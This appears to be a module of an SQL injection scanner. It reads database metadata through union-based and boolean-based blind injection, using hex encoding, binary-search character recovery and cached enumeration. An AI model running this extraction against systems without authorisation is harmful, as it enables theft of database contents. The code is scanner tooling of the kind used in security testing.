///|
fn metadata_hex(db : @core.Dbms, query : String) -> String {
  if db == SQLite {
    "hex(CAST((" + query + ") AS BLOB))"
  } else {
    "encode(convert_to(COALESCE(CAST((" +
    query +
    ") AS text),''),'UTF8'),'hex')"
  }
}

///|
fn unhex(value : String) -> String? {
  if value.length() % 2 != 0 {
    return None
  }
  let bytes : Array[Byte] = []
  for i = 0; i < value.length(); i = i + 2 {
    let n = @string.parse_int(value[i:i + 2].to_owned(), base=16) catch {
      _ => return None
    }
    bytes.push(n.to_byte())
  }
  Some(@utf8.decode(Bytes::from_array(bytes)) catch { _ => return None })
}

///|
async fn truth(
  ctx : @core.ScanContext,
  parameter : @core.Parameter,
  baseline : @core.Response,
  p : @core.InjectionPoint,
  predicate : String,
) -> Bool? {
  guard send(
      ctx,
      "metadata-boolean",
      parameter~,
      value=boolean_value(p, predicate),
    )
    is Some((r, _)) else {
    return None
  }
  if (r.status < 200 || r.status >= 300) && ctx.options.comparison.code is None {
    return None
  }
  Some((ctx.compare)(baseline, r))
}

///|
/// Only called with built-in metadata expressions; no arbitrary SQL API is exposed.
async fn scalar(
  ctx : @core.ScanContext,
  parameter : @core.Parameter,
  baseline : @core.Response,
  p : @core.InjectionPoint,
  query : String,
) -> String? {
  let hex = metadata_hex(p.database, query)
  if p.technique == UnionBased {
    let left = "sml\{ctx.attempted}a"
    let right = "smr\{ctx.attempted}z"
    let expression = computed(left) + "||(" + hex + ")||" + computed(right)
    guard send(
        ctx,
        "metadata-union",
        parameter~,
        value=union_value(p, expression),
      )
      is Some((r, _)) else {
      return None
    }
    if r.status < 200 || r.status >= 300 {
      return None
    }
    guard r.body.find(left) is Some(start) else { return None }
    let rest = r.body[start + left.length():].to_owned()
    guard rest.find(right) is Some(end) else { return None }
    return unhex(rest[:end].to_owned())
  }
  if p.technique != BooleanBased {
    return None
  }
  // Exponential bound then binary search; caps prevent unbounded metadata work.
  guard truth(ctx, parameter, baseline, p, "length(" + hex + ")<=8192")
    is Some(true) else {
    return None
  }
  let mut lo = 0
  let mut hi = 8192
  while lo < hi {
    let mid = (lo + hi) / 2
    guard truth(ctx, parameter, baseline, p, "length(" + hex + ")>\{mid}")
      is Some(more) else {
      return None
    }
    if more {
      lo = mid + 1
    } else {
      hi = mid
    }
  }
  let length = lo
  let text = StringBuilder()
  for i in 1..<=length {
    let code = (if p.database == SQLite { "unicode" } else { "ascii" }) +
      "(substr(" +
      hex +
      ",\{i},1))"
    let mut lo = 48
    let mut hi = 102
    while lo < hi {
      let mid = (lo + hi) / 2
      guard truth(ctx, parameter, baseline, p, code + ">\{mid}") is Some(more) else {
        return None
      }
      if more {
        lo = mid + 1
      } else {
        hi = mid
      }
    }
    guard truth(ctx, parameter, baseline, p, code + "=\{lo}") is Some(true) else {
      return None
    }
    text.write_char(lo.unsafe_to_char())
  }
  if !restore(ctx, baseline, parameter) {
    return None
  }
  unhex(text.to_string())
}

///|
async fn read_metadata(
  ctx : @core.ScanContext,
  parameter : @core.Parameter,
  baseline : @core.Response,
  points : Array[@core.InjectionPoint],
  query : String,
) -> String? {
  for p in points {
    if p.technique != UnionBased && p.technique != BooleanBased {
      continue
    }
    if scalar(ctx, parameter, baseline, p, query) is Some(value) {
      return Some(value)
    }
    if ctx.has_errors() {
      return None
    }
  }
  None
}

///|
fn result(
  ctx : @core.ScanContext,
  kind : String,
  values : Array[String],
  complete : Bool,
  message : String?,
) -> @core.EnumerationResult {
  {
    kind,
    database: ctx.options.enumeration.database,
    table: ctx.options.enumeration.table,
    values,
    complete,
    cached: false,
    message,
  }
}

///|
async fn collect(
  ctx : @core.ScanContext,
  parameter : @core.Parameter,
  baseline : @core.Response,
  points : Array[@core.InjectionPoint],
  kind : String,
  expression : String,
  from : String,
  order : String,
) -> @core.EnumerationResult {
  guard read_metadata(
      ctx,
      parameter,
      baseline,
      points,
      "SELECT count(*) " + from,
    )
    is Some(count) else {
    return result(ctx, kind, [], false, Some("Could not read metadata count"))
  }
  let count = @string.parse_int(count) catch {
    Failure::_ =>
      return result(ctx, kind, [], false, Some("Invalid metadata count"))
    err => raise err
  }
  if count < 0 {
    return result(ctx, kind, [], false, Some("Invalid metadata count"))
  }
  let values : Array[String] = []
  let cache_key = ctx.session_key + ":enum:" + kind + ":" + ctx.baseline_key
  if !ctx.options.fresh_queries &&
    !(kind == "columns" && ctx.options.enumeration.column is Some(_)) &&
    ctx.session is Some(store) {
    let partial = read_enumeration_cache(store, cache_key)
    if partial is Some(partial) &&
      !partial.complete &&
      partial.values.length() <= count.min(1000) &&
      !partial.values.is_empty() {
      let last = partial.values.length() - 1
      let previous = read_metadata(
        ctx,
        parameter,
        baseline,
        points,
        "SELECT " +
        expression +
        " " +
        from +
        " ORDER BY " +
        order +
        " LIMIT 1 OFFSET \{last}",
      )
      if previous == Some(partial.values[last]) {
        values.append(partial.values)
      }
    }
  }
  for i in values.length()..<count.min(1000) {
    guard read_metadata(
        ctx,
        parameter,
        baseline,
        points,
        "SELECT " +
        expression +
        " " +
        from +
        " ORDER BY " +
        order +
        " LIMIT 1 OFFSET \{i}",
      )
      is Some(value) else {
      return result(
        ctx,
        kind,
        values,
        false,
        Some("Metadata reading was interrupted"),
      )
    }
    values.push(value)
    if ctx.session is Some(store) {
      let partial = result(
        ctx,
        kind,
        values,
        false,
        Some("Metadata reading checkpoint"),
      )
      write_enumeration_cache(
        ctx, store, cache_key, partial, "Failed to write enumeration checkpoint",
      )
    }
  }
  result(
    ctx,
    kind,
    values,
    count <= 1000,
    if count > 1000 {
      Some("Metadata exceeded the 1000-item limit; partial results preserved")
    } else {
      None
    },
  )
}
